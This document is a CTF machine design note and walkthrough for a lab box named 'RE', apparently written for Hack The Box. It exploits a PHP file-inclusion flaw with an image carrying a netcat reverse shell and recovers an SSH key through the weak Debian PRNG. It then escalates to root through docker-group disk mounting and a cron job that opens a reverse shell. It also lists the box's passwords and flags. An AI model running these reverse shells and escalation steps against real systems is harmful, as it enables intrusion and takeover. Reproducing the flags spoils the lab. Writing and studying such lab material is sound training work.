# RE

## Introduction

This box is designed to get players gaining permissions on the target machine by discovering vulnerabilities in the web service,then lift the weight through ssh blasting and docker container. The three intended exploits are discovering and exploiting file inclution vulnerabilities, using pseudorandom number to obtain private ke according to ssh public key and using Docker to upgrade to root permissions. In this machine,common Docker techniques are used,but it's not about using Docker to build web service  and guide users to escape caontainers,but rather using the permissions of users in the Docker group for authorization enhancement. There are some CTF characteristics of this machine regarding the explosion of SSH private keys. The purpose of this design is to allow users to pay attention to the configuration of permissions for important files,Then think about how to utilize these sensitive files.

## Info for HTB

### Access

Passwords:

| User   | Password     |
| ------ | ------------ |
| escape | DLLdll123    |
| root   | roottoor2024 |

### Key Processes

Apache builds web service

- All access is through IP and does not involve domain names
- There are three folders under the root path: image, uploads, and news.The news folder contains a time.php file, which is used to display the current time. The home.php file is used to navigate to the specified webpage content file.Display the current time on the webpage, prompting the user that the file inclution vulnerabilities.
- From the home.php file, users can navigate to the page used to upload files, upload JPG images to a specified folder, and combine the file with vulnerability getshell.

SSH service enabled, allowing users to perform private key identity authentication.The. ssh directory of the escape user allows all users to view it.

Docker is the latest version, and users need to install the commands required for disk mounting of Docker themselves. And there is a user in Docker group.

### Automation / Crons

This machine does not have any user created automatic tasks, except for the default ones that exist.

### Firewall Rules

No firewall settings have been deployed on this machine.

### Docker

/etc/default/docker:

#Docker SysVinit configuration file

#THIS FILE DOES NOT APPLY TO SYSTEMD

#Please see the documentation for "systemd drop-ins":

#https://docs.docker.com/engine/admin/systemd/

#Customize location of Docker binary (especially for development testing).

#DOCKERD="/usr/local/bin/dockerd"

#Use DOCKER_OPTS to modify the daemon startup options.

#DOCKER_OPTS="--dns 8.8.8.8 --dns 8.8.4.4"

I#f you need Docker to use an HTTP proxy, it can also be specified here.

#export http_proxy="http://127.0.0.1:3128/"

#This is also a handy place to tweak where Docker's temporary files go.

#export DOCKER_TMPDIR="/mnt/bigdrive/docker-tmp"

### Other

All flags of the machine are located in their respective home directories, and the flag format is base64 encoding.

# Writeup

## Enumeration

### Nmap

```
nmap -p- 192.168.227.176 --min-rate 10000
```

![image-20240127142103142](RE.assets/image-20240127142103142.png)

We found that ports 21, 22, and 80 are enabled.

```
sudo nmap -p 21,22,80 -sT -sV -O
```

![image-20240127144602390](RE.assets/image-20240127144602390.png)

We have obtained detailed information about the port,We find ftp,http and ssh running on their usual ports.

### web

Browsing port 80 and discovering that it is the default interface of Apache.

![image-20240127145339162](RE.assets/image-20240127145339162.png)

Exploding the website's directory.

```
dirb http://192.168.227.176
```

![image-20240127145611787](RE.assets/image-20240127145611787.png)

We have found paths for uploads, news, and images, where the news path displays 403![image-20240127145916515](RE.assets/image-20240127145916515.png)

Exploding PHP files on websites,

![image-20240127150048376](RE.assets/image-20240127150048376.png)

We find a new file named info.php.Through a browser, it was found that it was the interface of phpinfo.

![image-20240127150221299](RE.assets/image-20240127150221299.png)

Next,we should perform path blasting on the news directory,![image-20240127150613784](RE.assets/image-20240127150613784.png)

There is no result here, blasting the PHP files in this directory.

![image-20240127151121520](RE.assets/image-20240127151121520.png)

We find two php files.The time.php file displays the current time.

![image-20240127151321616](RE.assets/image-20240127151321616.png)

We directly redirected the home.php file and saw the parameters from the URL,![image-20240127152012004](RE.assets/image-20240127152012004.png)

![image-20240127152050462](RE.assets/image-20240127152050462.png)

![image-20240127152108298](RE.assets/image-20240127152108298.png)

We found that the content of the time displayed on these three web pages is consistent with the content displayed in the time.php file,we speculate that there is a file including vulnerability.First, we need determine the parameters.We connect a parameter file with the&symbol and specify the value of the parameter as/etc/passwd. Then, we explode the parameter using burpsuite.

![image-20240127171007964](RE.assets/image-20240127171007964.png)

The dictionary selected here is /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt .

![image-20240127171508629](RE.assets/image-20240127171508629.png)

Finally,we find the paremeter's name is filename.

![image-20240127191625539](RE.assets/image-20240127191625539.png)

When the value of parameter page is 4, we see the location of the file upload.

![image-20240128212710159](RE.assets/image-20240128212710159.png)

We select a picture in jpg format, edit the picture and add a statement to get shell to it.

```
<?php system('nc -nv 192.168.227.130 5555 -e /bin/bash');?>
```



![image-20240127192719818](RE.assets/image-20240127192719818.png)

After uploading the file, we got a hint that the upload was successful.

![image-20240128213014521](RE.assets/image-20240128213014521.png)

We went to the uploads directory we found earlier and found the uploaded picture.![image-20240127193213193](RE.assets/image-20240127193213193.png)

Now point the value of filename to the address of the image, use nc to isten locally on port 5555and successfully get the shell.

``` 
nv -lvvp 5555
```

![image-20240127193631767](RE.assets/image-20240127193631767.png)

### Get the first flag

Using python to upgrade we get shell.Then enter the /home directory and find a user named escape.

```
python3 -c 'import pty;pty.spawn("/bin/bash")';
cd /home
ls
cd escape
cat escape.txt
```

![image-20240129102451787](RE.assets/image-20240129102451787.png)

### Explode ssh private key

By viewing permissions, we find that we can view the public key file of user named escape.

```
ls -la
cd .ssh
ls
cat id_rsa.pub
```

![image-20240127195239388](RE.assets/image-20240127195239388.png)

We set up a simple http server through python to download the public key.

```
python3 -m http.server 8081
```

![image-20240127195750911](RE.assets/image-20240127195750911.png)

```
wget http://192.168.227.176:8081/id_rsa.pub
```

![image-20240127195853231](RE.assets/image-20240127195853231.png)

We use searchsploit to search for pseudorandom number generation and choose 5622.txt as the payload.

```
searchsploit prng
searchsploit -m 5622.txt
```

![image-20240127200127141](RE.assets/image-20240127200127141.png)

Look at the 5622.txt file and find that you need to download a file and decompress it after download.

```
cat 5622.txt
```

![image-20240127200505880](RE.assets/image-20240127200505880.png)

```
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
```

![image-20240127200549632](RE.assets/image-20240127200549632.png)

```
tar vjxf 5622.tar.bz2
```

![image-20240127200639473](RE.assets/image-20240127200639473.png)

We copy a field from the id_rsa.pub file and go to the / rsa/2048/ directory to search for the string.

![image-20240127200854760](RE.assets/image-20240127200854760.png)

```
cd /rsa/2048
grep -lr "AAAAB3NzaC1yc2EAAAABIwAAAQEAz4C3CI+zWa"
```

![image-20240127200940932](RE.assets/image-20240127200940932.png)

Through the search, we found a public key file, and we copied the corresponding private key file and gave 600 permissions.And then log in to ssh through the private key.

```
cd ../..
cp rsa/2048/65e690ae2dd38d8972977ce8f73e970d-25705 ./ssh1
chmod 600 ssh1 
ssh escape@192.168.227.176 -i ssh1
```

![image-20240127201401682](RE.assets/image-20240127201401682.png)

### Using docker to upgrade privileges

View the identity of the current user.

```
id
```

![image-20240127201608906](RE.assets/image-20240127201608906.png)

Found that the current user is in the docker group.Check which images are in the docker.

```
docker images
```

![image-20240127201744942](RE.assets/image-20240127201744942.png)

Use privileged mode to turn on mirroring.

```
docker run --rm --privileged=true -it ubuntu
```

There is no fdisk command in the image by default. Download the fdisk command first.

```
apt-get update
apt-get install fdisk
```

![image-20240127202707825](RE.assets/image-20240127202707825.png)

Check how the disk hangs, create a /test directory in the container, and hang the host files to the / test directory.

```
fdisk -l
mkdir /test && mount /dev/sda1 /test
```

We confirm that we have successfully mounted the disk by looking at the shadow file.

![image-20240128102920975](RE.assets/image-20240128102920975.png)

Now we can lift the power through the automatic task, write the code that bounces shell into the file, and give the permission to execute the file.

```
echo 'nc -nv 192.168.227.130 6666 -e /bin/bash' > /test/tmp/shell.sh
chmod +x /test/tmp/shell.sh
```

![image-20240128103707943](RE.assets/image-20240128103707943.png)

Then write the scheduled task to the / etc/crontab file.

```
echo '*/1 * * * * root /tmp/shell.sh' > /test/etc/crontab
```

![image-20240128104913475](RE.assets/image-20240128104913475.png)

Kali uses nc to listen on local port 6666.Received a connection from the machine root user.

```
nc -lvvp 6666
python3 -c 'import pty;pty.spawn("/bin/bash")';
```

![image-20240128105251457](RE.assets/image-20240128105251457.png)

### The second flag

```
cat root.txt
```

![image-20240128105356544](RE.assets/image-20240128105356544-17064110207191.png)

### Two flags

The first flag is in escape's home

```
453FCA97121FED2DE099F37C402D2EB8
```

The second flag is in root's home

```
2A61C5B0E565576943EBF2BD0DD47BD0
```

